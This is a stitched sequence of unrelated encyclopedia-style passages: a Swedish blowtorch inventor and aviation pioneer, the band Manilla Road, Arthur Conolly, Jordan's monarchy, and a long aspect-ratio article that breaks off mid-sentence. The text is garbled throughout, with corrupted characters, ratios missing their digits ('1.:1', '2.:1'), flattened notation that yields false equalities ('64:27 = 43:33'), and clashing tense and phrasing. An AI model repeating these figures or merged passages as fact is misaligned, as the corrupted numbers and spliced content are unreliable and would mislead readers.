Nyberg was a pioneer in mechanical engineering. He received a patent for a blow lamp and was an aviation pioneer. Biography Nyberg was born at Arboga in V√§stmanland, Sweden. After school he started working for a jeweller and later he moved to Stockholm and worked with various metalworks. He later worked for Johan Erik Erikson (1838-1883) at J. E. Eriksons mekaniska verkstad. While working there he had the idea of the blowtorch. He later worked on the idea and created a blowtorch with strong, directed heat and with several safety measures. In 1882 he set up a workshop at Luntmakargatan in Stockholm making blowtorches. However the business didn't work well because it took too long to both manufacture and sell. In 1884 he moved his workshop to Sundbyberg. In 1886, he met Max Sievert (1849‚Äì1913) who had founded AB Sieverts Kabelverk in Sundbyberg. Sievert became interested in Nyberg's blowtorch and started selling it. Nyberg started AB Alpha and after encouragement from Lars Magnus Ericsson (1846‚Äì1926), founder of telephone equipment manufacturer Ericsson, he started producing wire. After Primus started producing blowtorches he also decided to make paraffin oil/kerosene cookers. The first model, called Viktoria, wasn't very successful, but the later Svea did better. He delivered many to Russia and soon he produced 3000 per week. In 1906 the company was changed into a stock company. He was generous to his workers and often gave them stock in the company. Nyberg worked on many other inventions including steam engines, aeroplanes and boat propellers. He was most known as an aviation pioneer. From 1897 and onward until around 1910, outside his home in Liding√∂ he built and tested his Flugan on a circular wood track in his garden and on the ice during the wintertime. He worked with the help of professor Johan Erik Cederblom (1834-1913) at KTH in the development of wing profiles but did not succeed to get Flugan in the air. He also designed and built his own wind tunnel to be able to make test of small wing models. Flugan had a wingspan of 5 meters, and the surface area of the wings was 13 m¬≤. The engine was a steam engine of his own design, with a boiler heated by four of his blowtorches. It produced a maximum of 10 hp (7 kW) at 2000 rpm. The total weight of the plane was 80 kg.

Achieving moderate success in the mid-80s with several well-received releases such as Crystal Logic (1983), Open the Gates (1985) and The Deluge (1986), the band became known for both the nasal voice of vocalist Mark Shelton and his eclectic style of songwriting, with many of his compositions taking place in fantastical universes combining elements of ancient mythologies and of popular culture mythos such as Robert E. Howard's Conan and H. P. Lovecraft's Cthulhu. After a major breakup in 1992, the band was reformed by Shelton in the mid-90s, although without co- founder Scott Park and a record label. The following years for Manilla Road were spent mostly by taking gigs in underground mid-western shows without the release of any new material. Seemingly forgotten, Manilla Road was re- discovered by the metal scene after performing at the Bang Your Head festival in 2000, which resulted in the band signing a new record deal and the eventual releases of Atlantis Rising in 2001 and Spiral Castle in 2002. This second era of Manilla Road continued until the death of founder Mark Shelton, who died in 2018 the day after the band played in an outdoor festival in Germany. History =Early years (1977‚Äì1982)= Manilla Road was created by guitarist and vocalist Mark Shelton in 1977 along with fellow roommates Scott Park at the bass and Benny Munkirs at the drums and Robert Park playing rhythm guitar. The band name \\"Manilla Road\\" came to be one night when Shelton and Munkirs were both drinking while watching Monty Python's Flying Circus. After playing in local bars around Wichita, the group first gained attention with their song \\"Herman Hill\\", inspired by the Herman Hill riot. Following an accident that took the life of the band's head sound and light engineer, drummer Benny Munkirs decided to leave the band along with Robert and was replaced by Myles Sype on drums. The band then proceeded to record a three- songs demo in 1979 titled Manilla Road Underground, which around a hundred copies on cassette were distributed to local radio stations and simply anyone who would listen. Unhappy with Sype's drumming, the rest of the band found a replacement in Rick Fisher, a high school friend of Shelton. It was with this early line-up that Manilla Road released their first studio album Invasion in 1980 on the band's own label, Roadster Records. Between this time and their next release the band recorded material in 1981 for an album to be tentatively titled Dreams Of Eschaton, however this was not released until 2002 by Monster Records (under the name Mark of the Beast) as Shelton was not happy with the sound. Shelton has since been quoted as saying the music was \\"not metal enough\\" and \\"sounded like shit\\". Despite this, Mark of the Beast was critically well-received when it was eventually released. Together with Invasion, these early albums have more in common with progressive rock and space rock than the band's later heavy metal sound. The next studio album was Metal in 1982, which began to define the future musical direction of Manilla Road. Their \\"classic\\" sound was truly solidified with the release of Crystal Logic in 1983. The reception of the Crystal Logic album resulted in the band getting exposure in Europe, which in turn landed them an overseas record deal with French label Black Dragon Records. =Second Line-up (1982‚Äì1991)= Manilla Road 2nd line-up; from left to right: Scott Park, Randy Foxe, Mark Shelton Despite the success of Crystal Logic, drummer Rick Fisher did not felt at ease with the way the band was evolving musically. With Fisher agreeing to step down, a more thrash metal-oriented drummer in Randy Foxe was brought in. This second line-up would stay together for the next five Manilla Road studio albums (along with a live release, Roadkill, in 1988). Along with Crystal Logic, the new line-up's first two albums, Open the Gates (1985) and The Deluge (1986) are generally considered to be classics in the field of early epic heavy metal. Lyrics began to feature more and more of Shelton's recurrent allusions to fantastic elements from Norse mythology, Arthurian legend and other literary sources. The Open the Gates studio album in 1985 was the first one to receive significant promotion from the start due to the efforts of their new label Black Dragon. According to an interview done by Mark Shelton in 2017, tens of thousand of copies were sold in the first months following the release. Their next studio album, The Deluge in 1986, followed up on that success. While commercial success never was a main goal for Shelton, the band's popularity in Europe at the time reached a career peak. The release of Mystification in 1987 coincided with the beginning of long-term financial troubles for Black Dragon Records in Europe, who soon after lost their distribution partners in both North America and Europe. Marketing malpractices by Black Dragon also resulted in several bands signed under them getting blacklisted by distributors in North America. Problems also began to surface for Manilla Road as Mystification suffered from exceptionally poor production quality, a result from the substandard equipment used at a new studio the band hoped would improve their sound. Modern re-issues of the album have since fixed this problem to a large extent. After Mystification came Out of the Abyss in 1988. The album was initially released by American label Leviathan Records (David Chastain's) instead of Black Dragon due to their distribution issues. Selling significantly better than Mystification, the album nevertheless was criticized at the time for its overt-thrash metal influences but has since become more appreciated by the band's present day audience. The next studio album, The Courts of Chaos, was released in 1990. The release of the album was unusual in that it was done by both Black Dragon Records, for the European market, and Leviathan Records, for the North American market. The North American release of The Courts of Chaos was also done under the name \\"Mark Shelton\\" instead of \\"Manilla Road\\" due to the blacklisting of bands signed under Black Dragon Records at the time by North American distributors. The album featured a more \\"classical\\" Manilla Road sound and was therefore better received by critics at the time. One point of contention was the use of programmed drum samples by drummer Randy Foxe during production. The Courts of Chaos would end up being the last Manilla Road release to feature both Randy Foxe and Scott Park. =The Circus Maximus (1992‚Äì1994)= In 1991, personal tensions in the band while touring were beginning to surface, particularly between Foxe and Park. Combined with the recent distribution issues in North America, the band members decided to take a hiatus and go their separate ways. Mark Shelton formed a band signed under Black Dragon Records called The Circus Maximus along with Andrew Coss and Aaron Brown, who did the front cover artwork for both Out of the Abyss and The Courts of Chaos. Despite never having been intended to be a Manilla Road project due to the lack of musical coherence with the previous releases, the album was nevertheless released in 1992 under the name \\"Manilla Road\\" in Europe at Black Dragon's insistence, a move that created great upset to Mark Shelton and the other two members of Manilla Road, Randy Foxe and Scott Park. Together with the bad reception of the album by critics and fans alike, the incident convinced Shelton to go on a recording hiatus that would last for nearly a decade. =Reformation (1994‚Äì2001)= Shelton continued to do live gigs with the other two members of Circus Maximus until the group disbanded in 1994. He soon after decided to reform Manilla Road along with Randy Foxe at the drums and Harvey Patrick at the bass, who was the brother of the band's road manager Bryan Patrick. Unable to attract any attention for a record deal and refusing to do anymore business with Black Dragon Records, the band was reduced to perform at local shows for several years in relative obscurity. This reformation period for Manilla Road also had its first line-up change with Harvey Patrick leaving the band and Mark Anderson taking his place at the bass. This period of uncertainty continued up until the year 2000 when the band was invited to perform at the Bang Your Head!!! festival in Germany. Sensing an opportunity they could not afford to pass up, Shelton agreed and booked the festival but was forced to replace Randy Foxe at the drums with Troy Olson when the former notified Shelton that he would not be able to attend. The show in Germany was a huge morale booster for the band, with many European fans coming to show their support for Manilla Road despite years of seeming inactivity. It was also while the band was playing in Europe that a new, long-awaited record deal was signed, this time with German label Iron Glory Records. Once back to the United States, the band parted ways with Troy Olson and invited in Scott Peters to be the band's new permanent drummer along with Bryan Patrick, who acted as a second vocalist onstage in order to complement Shelton. It was with this line-up that the Atlantis Rising studio album was released in 2001, ending nine years of recording drought. A concept album blending many elements from Lovecraft's Cthulhu mythos with Greek and Norse mythology, the sound was much more consistent with the Manilla Road of old and was well-received by critics and fans despite some technical hiccups in the album's production. =Post-reformation (2002‚Äì2018)= The next studio album, Spiral Castle, was released in 2002 and received a similar positive reaction. From this album going forward (with the exception of Voyager), co-singer Bryan Patrick began to be much more implicated in the singing of the songs, eventually more or less splitting the workload with Shelton. The success the re-emerging band was enjoying however was not enough to prevent yet another round of line-up changes, with drummer Scott Peters and bassist Mark Anderson both leaving and getting replaced by Cory Christner at the drums and Harvey Patrick returning to the fold at the bass. Under this new line-up, the epic-themed Gates of Fire studio album was released in 2005 and the subsequent Viking-themed Voyager studio album in 2008, although co-singer Bryan Patrick had to sit out of Voyager due to personal issues. The Gates of Fire album was also the last one with Iron Glory Records (now Battle Cry Records) and a new record deal was signed with Italian label My Graveyard Productions for the release of Voyager. Mark \\"The Shark\\" Shelton (1957-2018)With both Gates of Fire and Voyager receiving again praise in the metal community, the band put out their fifteenth studio album in 2011 titled Playground Of The Damned. More changes were made to the band's line-up, with Bryan Patrick returning but his brother Harvey leaving. Bassist Vince Goleman was invited in but was forced to leave during the album's recording after he was diagnosed with M√©ni√®re's disease. Josh Castillo handled the rest of the recording sessions at the bass. A new record deal was signed for the release of Playground Of The Damned, this time with American label Shadow Kingdom Records. A European tour took place in late 2011, where Manilla Road was invited to perform at the Hammer of Doom VII festival in Germany. After the festival, Andreas \\"Neudi\\" Neuderth started his role as the band's new drummer as Christner became unable to tour anymore with the band. A long-time fan of Manilla Road, Neuderth was also the webmaster of Manilla Road's first official website and would later take charge of remastering several of the band's previous releases to better fit modern sound quality standards. On September 22 2012, a major record deal was signed with Golden Core, a subsidiary label of ZYX Music GMBH & Co KG. Soon after, Mysterium, the band's sixteenth studio album, was released on February 1 2013. The 11-minute song serving as the album's title track is a retelling of the last days of Shelton's great-great-great uncle, Ludwig Leichhardt, a 19th- century German explorer who vanished in the Australian interior during an expedition. The next and penultimate studio album for Manilla Road, The Blessed Curse, was released on February 13 2015 and is a Sumerian-themed double album. With a length surpassing 98 minutes, The Blessed Curse would become Manilla Road's longest studio album. A double CD re-issue of the Mark Of The Beast album (bundled with the 1979 demo Manilla Road Underground and After Midnight in-studio live performance) was released in 2016 by High Roller Records, this time under the correct original 1981 title Dreams Of Eschaton. A final change was made to the line-up right after The Blessed Curse, with Phil Ross replacing Josh Castillo at the bass. On May 26 2017, the band released their first ever single, In The Wake. This was followed with the release of To Kill A King, Manilla Road's final studio album. On July 27, 2018, a week before the band was booked to perform at Wacken 2018, band founder Mark Shelton died in a German hospital the day after the band played in the Headbangers Open Air festival the previous night. The cause of death was attributed to a heart attack having been precipitated by severe heat exhaustion. A GoFundMe campaign established to help fund Shelton's body repatriation to the United States and subsequent funeral expenses was met with quick success as over US$40,000 were raised in less than 48 hours. A memorial service in his honor was held on September 22 2018 at the Cotillion Ballroom in Wichita, Kansas.

He was a captain of the 6th Bengal Light Cavalry in the service of the British East India Company. He participated in many reconnaissance missions into Central Asia and coined the term The Great Game to describe the struggle between the British Empire and the Russian Empire for domination over Central Asia. Biography Conolly was a descendant of an √ì Conghalaigh clan of Ireland. He was a cousin of Sir William Macnaghten, Secretary of the company's Political and Secret Department. As a sixteen-year-old impressionable Cadet he sailed to India on the Grenville and listened to Reginald Heber, the newly appointed Bishop of Calcutta, evangelize. Thereafter Conolly sought to win over Muslims to a \\"kindlier\\" view of Christians, the first step in his view of propagating the Gospel. In July 1840, in a correspondence with Major Henry Rawlinson who had been recently appointed as the political agent in Kandahar, Conolly stated: > You've a great game, a noble game, before you.J.W.

In late 1829 he left Moscow for the Caucasus and Central Asia, arriving in Herat in September 1830 and in India in January 1831. In 1834 he published an account of his trip, which established his reputation as a traveller and writer.Journey to the North of India through Russia, Persia and Afghanistan] Lt. Arthur Conolly.

Abdullah was crowned the country's first king. The country's name was shortened to the Hashemite Kingdom of Jordan on 3 April 1949, after the 1948 Arab‚ÄìIsraeli War. The current Monarch was Abdullah II, since 9 June 1999 succeeding his father.

It is commonly expressed as two numbers separated by a colon, as in 16:9. For an x:y aspect ratio, the image is x units wide and y units high. Widely used aspect ratios include 1.85:1 and 2.39:1 in film photography, 4:3 and 16:9 in television, and 3:2 in still camera photography.  Some common examples  The most common aspect ratios used today in the presentation of films in cinemas are 1.85:1 and 2.39:1.The 2.39:1 ratio is commonly labeled 2.40:1, e.g., in the American Society of Cinematographers' American Cinematographer Manual (Many widescreen films before the 1970 SMPTE revision used 2.35:1). Two common videographic aspect ratios are 4:3 (1.:1), the universal video format of the 20th century, and 16:9 (1.:1), universal for high-definition television and European digital television. Other cinema and video aspect ratios exist, but are used infrequently. In still camera photography, the most common aspect ratios are 4:3, 3:2, and more recently found in consumer cameras, 16:9. Other aspect ratios, such as 5:3, 5:4, and 1:1 (square format), are used in photography as well, particularly in medium format and large format. With television, DVD and Blu-ray Disc, converting formats of unequal ratios is achieved by enlarging the original image to fill the receiving format's display area and cutting off any excess picture information (zooming and cropping), by adding horizontal mattes (letterboxing) or vertical mattes (pillarboxing) to retain the original format's aspect ratio, by stretching (hence distorting) the image to fill the receiving format's ratio, or by scaling by different factors in both directions, possibly scaling by a different factor in the center and at the edges (as in Wide Zoom mode).  Practical limitations  In motion picture formats, the physical size of the film area between the sprocket perforations determines the image's size. The universal standard (established by William Dickson and Thomas Edison in 1892) is a frame that is four perforations high. The film itself is 35 mm wide (1.38 in), but the area between the perforations is 24.89 mm √ó 18.67 mm (0.980 in √ó 0.735 in), leaving the de facto ratio of 4:3, or 1.:1. With a space designated for the standard optical soundtrack, and the frame size reduced to maintain an image that is wider than tall, this resulted in the Academy aperture of 22 mm √ó 16 mm (0.866 in √ó 0.630 in) or 1.375:1 aspect ratio.  Cinema terminology  The motion picture industry convention assigns a value of 1.0 to the image's height; an anamorphic frame (since 1970, 2.39:1) is often incorrectly described (rounded) as 2.40:1 or 2.40 (\\"two-four-oh\\"). After 1952, a number of aspect ratios were experimented with for anamorphic productions, including 2.66:1 and 2.55:1. A SMPTE specification for anamorphic projection from 1957 (PH22.106-1957) finally standardized the aperture to 2.35:1. An update in 1970 (PH22.106-1971) changed the aspect ratio to 2.39:1 in order to make splices less noticeable. This aspect ratio of 2.39:1 was confirmed by the most recent revision from August 1993 (SMPTE 195-1993). In American cinemas, the common projection ratios are 1.85:1 and 2.39:1. Some European countries have 1.:1 as the wide screen standard. The \\"Academy ratio\\" of 1.375:1 was used for all cinema films in the sound era until 1953 (with the release of George Stevens' Shane in 1.:1). During that time, television, which had a similar aspect ratio of 1.:1, became a perceived threat to movie studios. Hollywood responded by creating a large number of wide-screen formats: CinemaScope (up to 2.:1), Todd-AO (2.20:1), and VistaVision (initially 1.50:1, now 1.:1 to 2.00:1) to name just a few. The \\"flat\\" 1.85:1 aspect ratio was introduced in May 1953, and became one of the most common cinema projection standards in the U.S. and elsewhere. The goal of these various lenses and aspect ratios was to capture as much of the frame as possible, onto as large an area of the film as possible, in order to fully utilize the film being used. Some of the aspect ratios were chosen to utilize smaller film sizes in order to save film costs while other aspect ratios were chosen to use larger film sizes in order to produce a wider higher resolution image. In either case the image was squeezed horizontally to fit the film's frame size and avoid any unused film area. = Movie camera systems = Development of various film camera systems must ultimately cater to the placement of the frame in relation to the lateral constraints of the perforations and the optical soundtrack area. One clever wide screen alternative, VistaVision, used standard 35 mm film running sideways through the camera gate, so that the sprocket holes were above and below frame, allowing a larger horizontal negative size per frame as only the vertical size was now restricted by the perforations. There were even a limited number of projectors constructed to also run the print-film horizontally. Generally, however, the 1.50:1 ratio of the initial VistaVision image was optically converted to a vertical print (on standard four- perforation 35 mm film) to show with the standard projectors available at theaters, and was then masked in the projector to the US standard of 1.85:1. The format was briefly revived by Lucasfilm in the late 1970s for special effects work that required larger negative size (due to image degradation from the optical printing steps necessary to make multi-layer composites). It went into obsolescence largely due to better cameras, lenses, and film stocks available to standard four-perforation formats, in addition to increased lab costs of making prints in comparison to more standard vertical processes. (The horizontal process was also adapted to 70 mm film by IMAX, which was first shown at the Osaka '70 Worlds Fair.) Super 16 mm film was frequently used for television production due to its lower cost, lack of need for soundtrack space on the film itself (as it is not projected but rather transferred to video), and aspect ratio similar to 16:9 (the native ratio of Super 16 mm is 15:9). It also can be blown up to 35 mm for theatrical release and therefore is sometimes used for feature films.  Current video standards  = 1:1 (Square) = Square displays are rarely used in devices and monitors. Nonetheless, video consumption on social apps has grown rapidly and led to the emergence of new video formats more suited to mobile devices that can be held in horizontal and vertical orientations. In that sense, square video was popularized by mobile apps such as Instagram and has since been supported by other major social platforms including Facebook and Twitter. It can fill nearly twice as much screen space compared to 16:9 format (when the device is held differently while viewing from how video was recorded). = 4:3 standard = 4:3 (1.:1) (generally read as Four-Three, Four-by-Three, or Four-to-Three) for standard television has been in use since the invention of moving picture cameras and many computer monitors used to employ the same aspect ratio. 4:3 was the aspect ratio used for 35 mm films in the silent era. It is also very close to the 1.375:1 Academy ratio, defined by the Academy of Motion Picture Arts and Sciences as a standard after the advent of optical sound-on-film. By having TV match this aspect ratio, movies originally photographed on 35 mm film could be satisfactorily viewed on TV in the early days of the medium (i.e. the 1940s and the 1950s). With the adoption of high definition television, the majority of modern televisions are now produced with 16:9 displays instead. Apple's iPad series of tablets, however, continue to use 4:3 displays (despite other Apple products typically using widescreen aspect ratios) to better suit use as an e-reader. But the 2018 iPad Pro 11 inch uses a 1.43:1 Aspect ratio. = 16:10 standard = 16:10 (8:5) is an aspect ratio mostly used for computer displays and tablet computers. The width of the display is 1.6 times its height. This ratio is close to the golden ratio \\"\\\\varphi\\" which is approximately 1.618. LCD computer displays using the 16:10 ratio started to appear in the mass market from 2003. By 2008, 16:10 had become the most common aspect ratio for LCD monitors and laptop displays. Since 2010, however, 16:9 has become the mainstream standard, driven by the 1080p standard for high definition television and lower manufacturing costs. In 2005‚Äì2008, 16:10 overtook 4:3 as the most sold aspect ratio for LCD monitors. At the time, 16:10 also had 90% of the notebook market and was the most commonly used aspect ratio for laptops. However, 16:10 had a short reign as the most common aspect ratio. Around 2008‚Äì2010, there was a rapid shift by computer display manufacturers to the 16:9 aspect ratio and by 2011 16:10 had almost disappeared from new mass market products. According to Net Applications, by October 2012 the market share of 16:10 displays had dropped to less than 23 percent. = 16:9 standard = 16:9 (1.:1) (generally named as Sixteen-by-Nine, Sixteen-Nine, and Sixteen-to-Nine) is the international standard format of HDTV, non-HD digital television and analog widescreen television PALplus. Japan's Hi-Vision originally started with a 5:3 (= 15:9) ratio but converted when the international standards group introduced a wider ratio of to 3 (= 16:9). Many digital video cameras have the capability to record in 16:9 (= 42:32), and 16:9 is the only widescreen aspect ratio natively supported by the DVD standard. DVD producers can also choose to show even wider ratios such as 1.85:1 and 2.39:1 within the 16:9 DVD frame by hard matting or adding black bars within the image itself. However, it was used often in British TVs in the United Kingdom in the 1990s. It is now also being used in smartphones, laptops and many types of media. = 1.85:1 = When cinema attendance dropped, Hollywood created widescreen aspect ratios in order to differentiate the film industry from TV, with one of the most common being the 1.85:1 ratio. = 2:1 = The 2:1 aspect ratio was first used in the 1950s for the RKO Superscope format. Since 1998, cinematographer Vittorio Storaro has advocated for a format named \\"Univisium\\" that uses a 2:1 format. It is designed to be a compromise between the cinema 2.39:1 aspect ratio and the HD- TV broadcast 16:9 ratio. Univisium has gained little traction in the theatrical film market, but has recently been used by Netflix and Amazon Video for productions such as House of Cards and Transparent, respectively. This aspect ratio is standard on the acquisition formats mandated by these content platforms and is not necessarily a creative choice. Moreover, some mobile devices, such as the LG G6, LG V30, Huawei Mate 10 Pro, Google Pixel 2 XL, OnePlus 5T and Sony Xperia XZ3, are embracing the 2:1 format (advertised as 18:9), as well as the Samsung Galaxy S8, Samsung Galaxy Note 8, Samsung Galaxy S9 and Samsung Galaxy Note 9 with a slightly similar 18.5:9 format.The official Honor website displays that it has an 18:9 ratio (visit the gaming tab). The Apple iPhone X also has a similar screen ratio of 19.5:9 (2.16:1). = 2.35:1 and 2.39:1 = Anamorphic format is the cinematography technique of shooting a widescreen picture on standard 35 mm film or other visual recording media with a non-widescreen native aspect ratio. When projected, image have an approximated 2.35:1 or 2.39:1 (often rounded to 2.4:1) aspect ratio. \\"21:9 aspect ratio\\" is actually 64:27 (= 43:33), or approximately 2.37:1, and is a near both cinematic movie aspect ratios. Mobile devices are now starting to use the 21:9 format, such as the Sony Xperia 1. = Vertical video = Another trend arising from the widespread use of smartphones is vertical video (9:16) that is intended for viewing in portrait mode. It was popularized by Snapchat and is also now being adopted by Twitter, TikTok, and Facebook. Instagram Stories are also based on this aspect ratio.  Obtaining height, width, and area of the screen  Often, screen specifications are given by their diagonal length. The following formulae can be used to find the height (h), width (w) and area (A), where r stands for ratio, written as a fraction of x by y, and d for diagonal length. :r = \\\\frac{x}{y} :h = \\\\frac{d}{\\\\sqrt{r^2+1}} = \\\\frac{y \\\\times d}{\\\\sqrt{x^2+y^2}} :w = \\\\frac{r\\\\times d}{\\\\sqrt = \\\\frac{x \\\\times d}{\\\\sqrt{x^2+y^2}} :A = \\\\frac{r\\\\times d^2}{{r^2}+1} \\\\quad= \\\\frac{x \\\\times y \\\\times d^2}{x^2+y^2}  Distinctions  This article primarily addresses the aspect ratio of images as displayed, which is more formally referred to as the display aspect ratio (DAR). In digital images, there is a distinction with the ' (SAR), which is the ratio of pixel dimensions. If an image is displayed with square pixels, then these ratios agree. If, instead, non-square (\\"rectangular\\") pixels are used, then these ratios differ. The aspect ratio of the pixels themselves is known as the pixel aspect ratio (PAR) ‚Äì for square pixels this is 1:1 ‚Äì and these are related by the identity: :SAR √ó PAR = DAR. Rearranging (solving for PAR) yields: :PAR = DAR/SAR. For example, a 640 √ó 480 VGA image has a SAR of 640/480 = 4:3 and, if displayed on a 4:3 display (DAR = 4:3), has square pixels, hence a PAR of 1:1. By contrast, a 720 √ó 576 D-1 PAL image has a SAR of 720/576 = 5:4, but is displayed on a 4:3 display (DAR = 4:3), so by this formula it would have a PAR of (4:3)/(5:4) = 16:15. However, because standard definition digital video was originally based on digitally sampling analog television, the 720 horizontal pixels actually capture a slightly wider image to avoid loss of the original analog picture. In actual images, these extra pixels are often partly or entirely black, as only the center 704 horizontal pixels carry actual 4:3 or 16:9 image. Hence, the actual pixel aspect ratio for PAL video is a little different from that given by the formula, specifically 12:11 for PAL and 10:11 for NTSC. For consistency, the same effective pixel aspect ratios are used even for standard definition digital video originated in digital form rather than converted from analog. For more details refer to the main article. In analog images such as film there is no notion of pixel, nor notion of SAR or PAR, and \\"aspect ratio\\" refers unambiguously to DAR. Actual displays do not generally have non-square pixels, though digital sensors might; they are rather a mathematical abstraction used in resampling images to convert between resolutions. Non- square pixels arise often in early digital TV standards, related to digitalization of analog TV signals ‚Äì whose horizontal and vertical resolutions differ and are thus best described by non-square pixels ‚Äì and also in some digital videocameras and computer display modes, such as Color Graphics Adapter (CGA). Today they arise particularly in transcoding between resolutions with different SARs. DAR is also known as image aspect ratio and picture aspect ratio, though the latter can be confused with pixel aspect ratio.  Previous and currently used aspect ratios  :See list of common resolutions for a listing of computer resolutions and aspect ratios. :See list of film formats for a full listing of film formats, including their aspect ratios. Comparison of several film aspect ratios with the heights forced to be equal. * 1.19:1 (19:16): Sometimes referred to as the Movietone ratio, this ratio was used briefly during the transitional period when the film industry was converting to sound, from 1926 to 1932 approx. It is produced by superimposing an optical soundtrack over a full-gate 1. aperture in printing, resulting in an almost square image. Films shot in this ratio are often projected or transferred to video incorrectly using a 1.37 mask or squashed to 1.37. Examples of films shot in the Movietone ratio include Sunrise, M, Hallelujah! and, significantly more recently, The Lighthouse.Scott Eyman, The Speed of Sound: Hollywood and the Talkie Revolution, 1926‚Äì1930, New York, Simon & Schuster (1997), p. 222. * 1.25:1 (5:4): Once-popular aspect for larger format computer monitors, especially in the guise of mass-produced 17\\" and 19\\" LCD panels or 19\\" and 21\\" CRTs, using 1280√ó1024 (SXGA) or similar resolutions. Notably one of the few popular display aspect ratios narrower than 4:3, and one popularised by business (CAD, DTP) rather than entertainment use, as it is well-suited to full-page layout editing. Historically, 5:4 was also the original aspect ratio of early 405-line television broadcasts, which progressed to a wider 4:3 as the idea of broadcasting cinema films gained traction. * 1.:1 (4:3): 35 mm original silent film ratio, today commonly known in TV and video as 4:3. Also standard ratio for MPEG-2 video compression. This format is still used in many personal video cameras today and has influenced the selection or design of other aspect ratios. It is the standard Super 35mm ratio. * 1.37:1 (48:35): 16 mm and 35 mm standard ratio. * 1.375:1 (11:8): 35 mm full-screen sound film image, nearly universal in movies between 1932 and 1953. Officially adopted as the Academy ratio in 1932 by AMPAS. Rarely used in theatrical context nowadays, but occasionally used for other context. * 1.43:1: IMAX format. IMAX productions use 70 mm wide film (the same as used for 70 mm feature films), but the film runs through the camera and projector horizontally. This allows for a physically larger area for each image. * 1.5:1 (3:2): The aspect ratio of 35 mm film used for still photography when 8 perforations are exposed. Also the native aspect ratio of VistaVision, for which the film runs horizontally. Used on the Chrome OS-based Chromebook Pixel Notebook PC, the Game Boy Advance portable game console, the Surface Pro 3 laplet and Surface Studio. * 1.:1 (14:9): Widescreen aspect ratio sometimes used in shooting commercials etc. as a compromise format between 4:3 and 16:9. When converted to a 16:9 frame, there is slight pillarboxing, while conversion to 4:3 creates slight letterboxing. All widescreen content on ABC Family's SD feed until January 2016 were presented in this ratio. * 1.6:1 (16:10 = 8:5): Widescreen computer monitor ratio (for instance 1920√ó1200 resolution). * 1.:1 (5:3): 35 mm widescreen ratio, originally invented by Paramount Pictures, now a standard among several European countries. It is also the native Super 16 mm frame ratio. Sometimes this ratio is rounded up to 1.67:1. From the late 1980s to the early 2000s, Walt Disney Feature Animation's CAPS program animated their features in the 1.:1 ratio (a compromise between the 1.85:1 theatrical ratio and the 1.:1 ratio used for home video), this format is also used on the Nintendo 3DS's top screen as well. * 1.75:1 (7:4): Early 35 mm widescreen ratio, primarily used by MGM and Warner Bros. between 1953 and 1955, and since abandoned, though Disney has cropped some of its post-1950s full screen films to this ratio for DVD, including The Jungle Book. * 1.:1 (16:9 = 42:32): Video widescreen standard, used in high-definition television, one of three ratios specified for MPEG-2 video compression. Also used increasingly in personal video cameras. Sometimes this ratio is rounded up to 1.78:1. * 1.85:1 (37:20): 35 mm US and UK widescreen standard for theatrical film. Introduced by Universal Pictures in May, 1953. Projects approximately 3 perforations (\\"perfs\\") of image space per 4 perf frame; films can be shot in 3-perf to save cost of film stock. Also the ratio of Ultra 16 mm. * 1.896:1 (256:135): DCI / SMPTE digital cinema basic resolution container aspect ratio. *2:1: Recently popularized by the Red Digital Cinema Camera Company. Original SuperScope ratio, also used in Univisium. Used as a flat ratio for some American studios in the 1950s and abandoned in the 1960s. Also used in recent mobile phones such as the LG G6, Google Pixel 2 XL, HTC U11+, Xiaomi MIX 2S and Huawei Mate 10 Pro, while the Samsung Galaxy S8, Note 8, and S9 use the similar 18.5:9 ratio. * 2.165:1 (~28:13): iPhone X, Xs, Xs Max, 11, 11 Pro, 11 Pro Max * 2.2:1 (11:5): 70 mm standard. Originally developed for Todd-AO in the 1950s. Specified in MPEG-2 as 2.21:1, but hardly used. * 2.35:1 (~47:20): 35 mm anamorphic prior to 1970, used by CinemaScope (\\"'Scope\\") and early Panavision. The anamorphic standard has subtly changed so that modern anamorphic productions are actually 2.39, but often referred to as 2.35 anyway, due to old convention. (Note that anamorphic refers to the compression of the image on film to maximize an area slightly taller than standard 4-perf Academy aperture, but presents the widest of aspect ratios.) All Indian Bollywood films released after 1972 are shot in this standard for theatrical exhibition. * 2.:1 (64:27 = 43:33): TVs were produced with this aspect ratio between 2009 and 2012Goddard, Louis. Philips discontinuing super-wide Cinema 21:9 TVs due to lack of demand. The Verge. 2012-08-28. Retrieved 2013-03-18. and marketed as \\"21:9 cinema displays\\". But this aspect ratio is still seen on higher end monitors, and are sometimes called UltraWide monitors. * 2.39:1 (~43:18): 35 mm anamorphic from 1970 onwards. Aspect ratio of current anamorphic widescreen theatrical viewings, commercials, and some music videos. Often commercially branded as Panavision format or 'Scope'. * 2.4:1 (12:5): Rounded notation of 2.39:1, also as 2.40:1. Blu-ray Disc film releases may use only 800 instead of 803 or 804 lines of the 1920√ó1080 resolution, resulting in an even 2.4:1 aspect ratio. * 2.55:1 (~23:9): Original aspect ratio of CinemaScope before optical sound was added to the film in 1954. This was also the aspect ratio of CinemaScope 55. * 2.59:1 (~70:27): Cinerama at full height (three specially captured 35 mm images projected side-by-side into one composite widescreen image). * 2.:1 (8:3): Full frame output from Super 16 mm negative when an anamorphic lens system has been used. Effectively, an image that is of the ratio 24:9 is squashed onto the native 15:9 aspect ratio of a Super 16 mm negative. * 2.76:1 (~11:4): Ultra Panavision 70/MGM Camera 65 (65 mm with 1.25√ó anamorphic squeeze). Used only on a handful of films between 1957 and 1966 and three films in the 2010s, for some sequences of How the West Was Won (1962) with a slight crop when converted to three strip Cinerama, and films such as It's a Mad, Mad, Mad, Mad World (1963) and Ben-Hur (1959). Quentin Tarantino used it for The Hateful Eight (2015), Gareth Edwards for Rogue One (2016), Kirill Serebrennikov for Leto (2018). * 3.:1 (32:9): In 2017, Samsung and Phillips announced 'Super UltraWide displays', with aspect ratio of 32:9. * 3.6:1 (18:5): In 2016, IMAX announced the release of films in 'Ultra- WideScreen 3.6' format, with an aspect ratio of 36:10. Ultra-WideScreen 3.6 video format didn't spread, as cinemas in an even wider ScreenX 270¬∞ format were released. * 4:1: Rare use of Polyvision, three 35 mm 1.:1 images projected side by side. First used in 1927 on Abel Gance's Napol√©on. * 12:1: Circle-Vision 360¬∞ developed by the Walt Disney Company in 1955 for use in Disneyland. Uses nine 4:3 35 mm projectors to show an image that completely surrounds the viewer. Used in subsequent Disney theme parks and other past applications.  Aspect ratio releases  = Original aspect ratio (OAR) = Original Aspect Ratio (OAR) is a home cinema term for the aspect ratio or dimensions in which a film or visual production was produced ‚Äì as envisioned by the people involved in the creation of the work. As an example, the film Gladiator was released to theaters in the 2.39:1 aspect ratio. It was filmed in Super 35 and, in addition to being presented in cinemas and television in the Original Aspect Ratio of 2.39:1, it was also broadcast without the 